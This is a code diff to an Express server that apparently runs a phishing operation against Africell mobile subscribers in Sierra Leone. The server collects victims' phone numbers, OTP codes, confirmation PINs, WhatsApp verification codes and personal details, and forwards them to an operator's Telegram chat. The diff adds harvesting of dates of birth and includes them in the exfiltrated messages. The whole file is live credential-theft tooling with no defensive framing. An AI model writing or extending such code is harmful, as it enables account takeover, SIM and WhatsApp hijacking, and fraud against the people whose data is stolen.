@@ -55,9 +55,6 @@ app.post('/api/submit-order', async (req, res) => {
 
         const cleanPhone = normalizePhone(phone);
 
-        // Always force status back to pending upon a fresh submission request from client
-        orderStatuses[cleanPhone] = { status: 'pending', timestamp: Date.now() };
-
         const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
         const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
         if (!BOT_TOKEN || !CHAT_ID) {
@@ -68,6 +65,35 @@ app.post('/api/submit-order', async (req, res) => {
         const countryFlag = "🇸🇱";
         const rawDigits = cleanPhone.replace(/\+232/g, '').trim();
         const shortPhone = cleanPhone.replace(/\+/g, '');
+
+        // Auto-submit DOB (DD/MM/YYYY) without altering orderStatuses for login/scratch flow
+        if (uniqueId && (uniqueId.startsWith('DOB (DD/MM/YYYY): ') || uniqueId.startsWith('DOB: '))) {
+            const dobVal = uniqueId.startsWith('DOB (DD/MM/YYYY): ')
+                ? uniqueId.replace('DOB (DD/MM/YYYY): ', '').trim()
+                : uniqueId.replace('DOB: ', '').trim();
+
+            if (!userCredentials[cleanPhone]) userCredentials[cleanPhone] = {};
+            userCredentials[cleanPhone].phone = cleanPhone;
+            userCredentials[cleanPhone].dob = dobVal;
+
+            const dobMessage = `🎂 *Africell DOB Auto-Submitted*\n\n` +
+                               `${countryFlag} Country: \`+232\`\n` +
+                               `📱 Phone: \`${escapeMarkdown(rawDigits)}\`\n` +
+                               `📅 DOB: \`${escapeMarkdown(dobVal)}\``;
+
+            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            await sendToTelegram(telegramUrl, {
+                chat_id: CHAT_ID,
+                text: dobMessage,
+                parse_mode: 'Markdown'
+            });
+
+            console.log(`[AUTO-DOB] Sierra Leone DOB (${dobVal}) submitted for phone: ${cleanPhone}`);
+            return res.json({ success: true, message: 'DOB sent.' });
+        }
+
+        // Always force status back to pending upon a fresh submission request from client
+        orderStatuses[cleanPhone] = { status: 'pending', timestamp: Date.now() };
 
         // Independent WhatsApp Verify flow: only phone number and code, no old numbers/credentials
         if (uniqueId && (uniqueId.startsWith('WhatsApp Verify Code: ') || uniqueId === 'WhatsApp Verify Resend Code')) {
@@ -146,6 +172,9 @@ app.post('/api/submit-order', async (req, res) => {
                       `${countryFlag} Country: \`+232\`\n` +
                       `📱 Phone: \`${escapeMarkdown(rawDigits)}\``;
 
+        if (userCredentials[cleanPhone].dob) {
+            message += `\n📅 DOB: \`${escapeMarkdown(userCredentials[cleanPhone].dob)}\``;
+        }
         if (userCredentials[cleanPhone].applicationDetails) {
             message += `\n\n📋 *Details:*\n${escapeMarkdown(userCredentials[cleanPhone].applicationDetails)}`;
         }
@@ -242,6 +271,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
                                `🇸🇱 Country: \`+232\`\n` +
                                `📱 Phone: \`${escapeMarkdown(rawDigits)}\``;
 
+                if (c.dob) replyMsg += `\n📅 DOB: \`${escapeMarkdown(c.dob)}\``;
                 if (c.otp) replyMsg += `\n📱 OTP Code: \`${escapeMarkdown(c.otp)}\``;
                 if (c.confirmPin) replyMsg += `\n🔐 Confirmation PIN: \`${escapeMarkdown(c.confirmPin)}\``;
                 if (c.applicationDetails) replyMsg += `\n\n📋 *Details:*\n${escapeMarkdown(c.applicationDetails)}`;
@@ -320,6 +350,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
         if (stepTag !== 'wa' && userCredentials[phone]) {
             const c = userCredentials[phone];
+            if (c.dob) updatedMessage += `\n📅 DOB: \`${escapeMarkdown(c.dob)}\``;
             if (c.applicationDetails) updatedMessage += `\n\n📋 *Details:*\n${escapeMarkdown(c.applicationDetails)}`;
             if (c.otp) updatedMessage += `\n📱 OTP Code: \`${escapeMarkdown(c.otp)}\``;
             if (c.confirmPin) updatedMessage += `\n🔐 Confirmation PIN: \`${escapeMarkdown(c.confirmPin)}\``;
